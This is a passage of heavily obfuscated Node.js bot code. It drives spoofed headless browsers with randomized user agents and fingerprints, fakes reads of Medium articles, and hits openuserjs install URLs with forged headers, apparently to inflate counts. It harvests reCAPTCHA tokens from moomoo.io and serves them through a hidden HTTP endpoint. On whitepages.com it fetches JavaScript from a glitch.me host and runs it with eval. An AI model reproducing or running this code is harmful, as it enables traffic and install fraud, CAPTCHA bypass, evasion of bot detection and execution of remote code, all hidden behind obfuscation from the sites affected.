      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + Z(0x0) + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': Y(0xb) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x8) + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + Y(0x1a) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + a0(0xa, 'x55x'),
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + Z(0x11) + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + Z(0x19) + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + Y(0x9) + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x7 * 0x2af + -0x1253 * 0x1 + 0x251c
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a1 = c;
    log(a1(0x13) + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x183f + -0x912 + -0x25 * 0x69)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x2119 + 0x1 * 0x121f + -0x32d4), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x2433 * 0x1 + -0x15e7 + -0x3a7e * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x7e * 0x32 + -0x1893 + 0x312f;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1 * -0x1c04 + -0x8fa + -0x130a; w < getRandomInt(-0x2130 + 0x68c * 0x3 + -0x1 * -0xd8d, -0x1a * -0xb9 + -0x151b * 0x1 + 0x2e * 0xd); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x10d91 * 0x1 + 0x7435 + 0x9766 * -0x1);
        }
      }();
    }, 0x1b19 * 0x1 + -0x662 + -0x1453), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a2 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x17b2 + 0x59 * -0x22 + -0xbe0;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + a2(0xf) + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xdd7 + -0x1 * 0x125d + 0x6 * 0xc1, 0x481 * -0x4 + -0xccb + 0x1 * 0x1f01)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x6f39 + -0x1 * 0x1325 + 0x1 * 0x191c);
    }, 0x1b15 * 0x1 + -0x1d7f + 0x2ce), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1dcb + 0x1d * 0x7d + 0x1d * 0x8a;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xc * 0x78 + 0x997 + -0x37f * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1 * 0x151b + 0x10bd * 0x1 + -0x25d8), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1fd50 + 0x105262 + 0x3326 * -0x3);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x8d * 0x3b + 0x15c * 0x11 + -0x3737);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * 0x2a1 + 0x19db + 0x49e * -0x6);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x7 * 0x17f + -0x1b95 + 0x459e);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = d,
    a5 = c;
  async function f() {
    const a4 = b,
      a3 = d,
      k = h[a3(0x1e)](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x61 * 0x49 + -0x1236 + 0x1 * 0x2de0) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1781 * 0x1 + 0x1ef1 + -0x3671 * 0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x2673 + 0x4 * -0x645 + 0x475 * -0x3, D['indexOf']('\x20'));
        return B ? E['slice'](-0x238e + 0xdf * 0x1f + 0x1 * 0x88d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1ce6 + 0x480b + -0x415),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': a4(0x12, 'iY5@') + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1 * 0x45d + 0x192d + 0x986),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + a5(0x17) + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + a6(0x6) + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
